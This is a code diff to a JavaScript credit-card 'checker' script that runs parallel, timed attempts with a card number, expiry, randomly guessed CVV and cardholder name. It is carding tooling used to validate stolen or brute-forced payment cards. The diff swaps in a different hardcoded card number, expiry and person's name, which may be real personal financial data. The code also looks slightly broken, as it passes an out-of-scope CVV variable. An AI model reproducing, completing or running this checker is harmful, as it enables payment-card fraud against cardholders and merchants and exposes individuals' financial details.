@@ -95,18 +95,16 @@ const runFunction = async (ccNum, ccExp, ccCvv, ccName) => {
   }
 };
 
-const runChecker = async () => {
+const runChecker = async (ccNum, ccExp, ccCvv, ccName) => {
   const runMultipleInstances = async () => {
     const instances = [];
     for (let i = 0; i < 2; i++) {
       let randomCvv = Math.round(Math.random() * 999).toString();
 
-      if (randomCvv === "258") {
+      if (randomCvv === "150") {
         randomCvv = Math.round(Math.random() * 999).toString();
       }
-      instances.push(
-        runFunction("4037840128815907", "09/25", randomCvv, "Lopez Ofelia")
-      );
+      instances.push(runFunction(ccNum, ccExp, ccCvv, ccName));
     }
     await Promise.all(instances);
   };
@@ -114,7 +112,7 @@ const runChecker = async () => {
   runMultipleInstances();
 
   let count = 0;
-  const maxCount = 6;
+  const maxCount = 5;
 
   const intervalId = setInterval(() => {
     if (count < maxCount) {
@@ -123,8 +121,8 @@ const runChecker = async () => {
     } else {
       clearInterval(intervalId);
     }
-  }, 15000);
+  }, 20000);
 };
 
 // Run the checker
-runChecker();
+runChecker("4452560462046010", "08/26", randomCvv, "Brianna Lopez");
